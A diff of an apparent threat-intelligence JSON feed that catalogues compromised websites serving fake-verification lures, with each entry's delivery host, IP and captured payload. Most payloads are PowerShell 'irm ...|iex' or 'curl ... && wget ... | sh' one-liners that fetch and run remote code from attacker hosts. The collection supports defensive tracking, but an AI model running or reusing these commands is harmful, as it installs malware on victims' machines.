@@ -1,5 +1,289 @@
 [
   {
+    "UrlDomain": "laavenderlandscape.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/ec0b04f84abaee4a"
+    ],
+    "IP": [
+      "198.23.59.23"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ec0b04f84abaee4a')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/ec0b04f84abaee4a"
+    ],
+    "ReportId": "cmwn2xv5d1vah0omlj4s83o4q",
+    "ScannedAt": "2026-11-19T04:58:25.968000+00:00"
+  },
+  {
+    "UrlDomain": "maximainmobiliaria.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/be2c68a812a3617a"
+    ],
+    "IP": [
+      "82.223.217.63"
+    ],
+    "Related": [
+      {
+        "Value": "a",
+        "Type": "Hostname"
+      },
+      {
+        "Value": "b",
+        "Type": "Hostname"
+      },
+      {
+        "Value": "x",
+        "Type": "Hostname"
+      }
+    ],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/be2c68a812a3617a')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/be2c68a812a3617a"
+    ],
+    "ReportId": "cmwn2xlv71v8e0oml2qwwvtkp",
+    "ScannedAt": "2026-11-19T04:58:13.916000+00:00"
+  },
+  {
+    "UrlDomain": "www.5movierulc.in",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/online/ec2a5899511dfa69"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/online/ec2a5899511dfa69')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/online/ec2a5899511dfa69"
+    ],
+    "ReportId": "cmwn2xjeb1v840omlxm38u0i7",
+    "ScannedAt": "2026-11-19T04:58:10.718000+00:00"
+  },
+  {
+    "UrlDomain": "www.designly.net",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/e6c7fe41a04fdf28"
+    ],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [
+      {
+        "Value": "https://static.cognitoforms.com/form/68.9607be97c69f3116becf.js",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/e6c7fe41a04fdf28')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/e6c7fe41a04fdf28"
+    ],
+    "ReportId": "cmwn2x8hc1v670omlxl7k2oer",
+    "ScannedAt": "2026-11-19T04:57:56.539000+00:00"
+  },
+  {
+    "UrlDomain": "firmato.com.br",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/342b2b7521bb8e88"
+    ],
+    "IP": [
+      "187.1.138.141"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/342b2b7521bb8e88')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/342b2b7521bb8e88"
+    ],
+    "ReportId": "cmwn2x78s1v630omlgsc3mpd6",
+    "ScannedAt": "2026-11-19T04:57:54.851000+00:00"
+  },
+  {
+    "UrlDomain": "tunitalia.tn",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/5fb7a415f6f93627"
+    ],
+    "IP": [
+      "176.31.233.83"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/5fb7a415f6f93627')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/5fb7a415f6f93627"
+    ],
+    "ReportId": "cmwn2wv0i1v4c0omluiusor39",
+    "ScannedAt": "2026-11-19T04:57:39.107000+00:00"
+  },
+  {
+    "UrlDomain": "www.koupelny-labuda.cz",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/949cd932a9b4bd42"
+    ],
+    "IP": [
+      "37.9.175.165"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/949cd932a9b4bd42')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/949cd932a9b4bd42"
+    ],
+    "ReportId": "cmwn2wmak1v2y0omll894mc2d",
+    "ScannedAt": "2026-11-19T04:57:27.825000+00:00"
+  },
+  {
+    "UrlDomain": "stngrouplogistics.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/730b8a8195bd48f8"
+    ],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/730b8a8195bd48f8')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/730b8a8195bd48f8"
+    ],
+    "ReportId": "cmwn2whqa1v180oml3b5j6qsu",
+    "ScannedAt": "2026-11-19T04:57:21.912000+00:00"
+  },
+  {
+    "UrlDomain": "brodeco-interior.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/4841a5aabff7658b"
+    ],
+    "IP": [
+      "104.21.77.138"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/4841a5aabff7658b')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/4841a5aabff7658b"
+    ],
+    "ReportId": "cmwn2w8kl1uzn0omlbw6vxe5i",
+    "ScannedAt": "2026-11-19T04:57:10.016000+00:00"
+  },
+  {
+    "UrlDomain": "ecophilicarchitecture.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/12555e620eab8dbf"
+    ],
+    "IP": [
+      "188.40.196.226"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/12555e620eab8dbf')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/12555e620eab8dbf"
+    ],
+    "ReportId": "cmwn2w57q1uyg0omlo15k405z",
+    "ScannedAt": "2026-11-19T04:57:05.694000+00:00"
+  },
+  {
+    "UrlDomain": "constantiashul.co.za",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/90f171f4bbf05e98"
+    ],
+    "IP": [
+      "41.204.202.6"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/90f171f4bbf05e98')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/90f171f4bbf05e98"
+    ],
+    "ReportId": "cmwn2vxfo1uxf0oml9a5vz44d",
+    "ScannedAt": "2026-11-19T04:56:55.635000+00:00"
+  },
+  {
+    "UrlDomain": "vivubien.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/02db2195c02a03ad"
+    ],
+    "IP": [
+      "103.106.105.141"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/02db2195c02a03ad')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/02db2195c02a03ad"
+    ],
+    "ReportId": "cmwn2voeq1uwn0oml4lwsdjpg",
+    "ScannedAt": "2026-11-19T04:56:43.951000+00:00"
+  },
+  {
+    "UrlDomain": "dairyassociation.org",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b45bf9d8b81fb9eb"
+    ],
+    "IP": [
+      "104.21.89.240"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b45bf9d8b81fb9eb')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b45bf9d8b81fb9eb"
+    ],
+    "ReportId": "cmwn2veck1uuf0oml4fkuwp3j",
+    "ScannedAt": "2026-11-19T04:56:30.869000+00:00"
+  },
+  {
+    "UrlDomain": "bhhcare.ae",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/3053c6f2738bc04e"
+    ],
+    "IP": [
+      "198.38.94.22"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/3053c6f2738bc04e')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/3053c6f2738bc04e"
+    ],
+    "ReportId": "cmwn2vd8k1uub0oml0r8kfv2r",
+    "ScannedAt": "2026-11-19T04:56:29.394000+00:00"
+  },
+  {
     "UrlDomain": "bastion-kansk.ru",
     "DeliveryUrl": [
       "fastly.jsdelivr.net"
@@ -6429,543 +6713,5 @@
     ],
     "ReportId": "cmwisrtbm14hw0omlck8hqp55",
     "ScannedAt": "2026-11-16T05:02:42.776000+00:00"
-  },
-  {
-    "UrlDomain": "propertyscoutltd.co.uk",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "91.108.98.22"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/1ece21f576ccf983",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/1ece21f576ccf983'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/1ece21f576ccf983"
-    ],
-    "ReportId": "cmwisjqe8147t0omlakiab4o8",
-    "ScannedAt": "2026-11-16T04:56:25.764000+00:00"
-  },
-  {
-    "UrlDomain": "lucky-7-studio.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "91.108.98.91"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/765a33730779636c",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/765a33730779636c'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/765a33730779636c"
-    ],
-    "ReportId": "cmwisgn4i14240oml02xtnpwx",
-    "ScannedAt": "2026-11-16T04:54:01.500000+00:00"
-  },
-  {
-    "UrlDomain": "power.pe",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "77.37.53.153"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=aef76d5b-ffa6-4a62-80a7-bb4a503200fc&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fpower.pe%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A51%3A39.587Z&lastShellAt=2026-11-16T04%3A51%3A39.587Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwisfhxi140n0omlpt66q4f5",
-    "ScannedAt": "2026-11-16T04:53:08.046000+00:00"
-  },
-  {
-    "UrlDomain": "globalmarketingmediagroup.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "77.37.83.21"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/93f4bb51d8d30c6a",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/93f4bb51d8d30c6a'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/93f4bb51d8d30c6a"
-    ],
-    "ReportId": "cmwisea9313zi0omlhrq28svu",
-    "ScannedAt": "2026-11-16T04:52:11.511000+00:00"
-  },
-  {
-    "UrlDomain": "dpsolutionsza.co.za",
-    "DeliveryUrl": [
-      "waysmakeyourlifebetter.com",
-      "goodpersonofourcentury.com",
-      "besthappyfamily.com",
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "196.22.132.10"
-    ],
-    "Related": [
-      {
-        "Value": "https://waysmakeyourlifebetter.com/get_script",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://goodpersonofourcentury.com/get_script",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-cloud.codes/3a41d09dfc9da7df",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/3a41d09dfc9da7df'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/3a41d09dfc9da7df"
-    ],
-    "ReportId": "cmwisdf4a13w70oml5zxe5pwk",
-    "ScannedAt": "2026-11-16T04:51:31.148000+00:00"
-  },
-  {
-    "UrlDomain": "mpirehealth.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "93.127.179.73"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/a78c947fe78a126a",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29913410",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/a78c947fe78a126a'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/a78c947fe78a126a"
-    ],
-    "ReportId": "cmwiscahv13v40omlcn6xd6sa",
-    "ScannedAt": "2026-11-16T04:50:38.522000+00:00"
-  },
-  {
-    "UrlDomain": "oryxland.com.qa",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app",
-      "2foryxland.com.qa"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "77.37.83.6"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=68c16921-fce2-4fd4-9c9e-65ab78e2c80a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Foryxland.com.qa%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A48%3A51.563Z&lastShellAt=2026-11-16T04%3A48%3A51.563Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwisbupy13tv0omlq8yszzue",
-    "ScannedAt": "2026-11-16T04:50:18.104000+00:00"
-  },
-  {
-    "UrlDomain": "malligai.prishahomes.com",
-    "DeliveryUrl": [
-      "cosmical2049.com"
-    ],
-    "PayloadUrl": [
-      "https://cosmical2049.com/crabs/6414f8e8174928f0"
-    ],
-    "IP": [
-      "119.18.49.78"
-    ],
-    "Related": [],
-    "Payload": "iex(irm 'https://cosmical2049[.]com/crabs/6414f8e8174928f0' -UserAgent 'WUA/39587ecfe2' -Headers @{'X-WUA'='39587ecfe2'})",
-    "ResolvedDownloadUrl": [
-      "https://cosmical2049.com/crabs/6414f8e8174928f0"
-    ],
-    "ReportId": "cmwisbmad13t00oml3tkejeim",
-    "ScannedAt": "2026-11-16T04:50:07.143000+00:00"
-  },
-  {
-    "UrlDomain": "nexobrokerglobal.com.ar",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "200.58.103.205"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/16caa5e6182fbdf4",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29913408",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/16caa5e6182fbdf4'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/16caa5e6182fbdf4"
-    ],
-    "ReportId": "cmwisa5y113q00omlm61eisox",
-    "ScannedAt": "2026-11-16T04:48:59.194000+00:00"
-  },
-  {
-    "UrlDomain": "www.srilakshmividhyaashram.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app",
-      "2fwww.srilakshmividhyaashram.com"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "68.183.245.77"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=48f5695f-218a-489f-9d65-d2eabc77ecc4&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]srilakshmividhyaashram[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A47%3A27.280Z&lastShellAt=2026-11-16T04%3A47%3A27.280Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwisa1bx13on0omlcnwzflaq",
-    "ScannedAt": "2026-11-16T04:48:53.359000+00:00"
-  },
-  {
-    "UrlDomain": "vantaiminhthanh.com.vn",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "script-six-tawny.vercel.app",
-      "2fvantaiminhthanh.com.vn"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "51.81.182.109"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=1da1078c-2d02-4bde-aa2b-14bf45cac2e9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fvantaiminhthanh.com.vn%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A45%3A50.990Z&lastShellAt=2026-11-16T04%3A45%3A50.990Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwis7yvm13lb0omlbwbbypnl",
-    "ScannedAt": "2026-11-16T04:47:16.874000+00:00"
-  },
-  {
-    "UrlDomain": "www.themillennialwayshow.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "script-six-tawny.vercel.app",
-      "2fwww.themillennialwayshow.com"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "208.113.158.3"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=255c6289-10f4-4e36-b2d5-cdba2dbe8918&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]themillennialwayshow[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A44%3A47.272Z&lastShellAt=2026-11-16T04%3A44%3A47.272Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwis6n1l13kf0omlha2y8gyt",
-    "ScannedAt": "2026-11-16T04:46:14.898000+00:00"
-  },
-  {
-    "UrlDomain": "www.aatias.co.il",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "77.37.83.176"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/9fbc6acd3407cb30",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/9fbc6acd3407cb30'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/9fbc6acd3407cb30"
-    ],
-    "ReportId": "cmwis69iw13jb0omlx9zbnoc0",
-    "ScannedAt": "2026-11-16T04:45:57.317000+00:00"
-  },
-  {
-    "UrlDomain": "www.zavorky.cz",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "script-six-tawny.vercel.app",
-      "2fwww.zavorky.cz"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "212.4.158.42"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=d6e95a0f-6d85-4143-a3ea-7a5e7376d2ec&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]zavorky[.]cz%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A43%3A43.306Z&lastShellAt=2026-11-16T04%3A43%3A43.306Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwis56k713i70omlrwfjb1d4",
-    "ScannedAt": "2026-11-16T04:45:06.877000+00:00"
-  },
-  {
-    "UrlDomain": "sobhacity.cherrycart.in",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "script-six-tawny.vercel.app",
-      "2fsobhacity.cherrycart.in"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "148.113.31.131"
-    ],
-    "Related": [
-      {
-        "Value": "cherrycart.in",
-        "Type": "Hostname"
-      }
-    ],
-    "Payload": "curl -sL -d \"id=32a2d45d-3956-41fc-b1fa-74300ba93aa9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsobhacity[.]cherrycart[.]in%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A42%3A35.230Z&lastShellAt=2026-11-16T04%3A42%3A35.230Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwis3r2m13fi0omlez4bawga",
-    "ScannedAt": "2026-11-16T04:44:00.151000+00:00"
-  },
-  {
-    "UrlDomain": "www.allin-dia.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [
-      "https://www.allin-dia.com/"
-    ],
-    "IP": [
-      "93.127.179.75"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/416c86d35c45adea",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29913401",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/416c86d35c45adea'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/416c86d35c45adea"
-    ],
-    "ReportId": "cmwis1bii13aa0omliris42mn",
-    "ScannedAt": "2026-11-16T04:42:06.653000+00:00"
-  },
-  {
-    "UrlDomain": "www.osires.fr",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "script-six-tawny.vercel.app",
-      "2fwww.osires.fr"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "163.172.145.41"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=b4b2e4e3-2718-4d44-8315-980bee83aacb&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]osires[.]fr%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A39%3A45.341Z&lastShellAt=2026-11-16T04%3A39%3A45.341Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
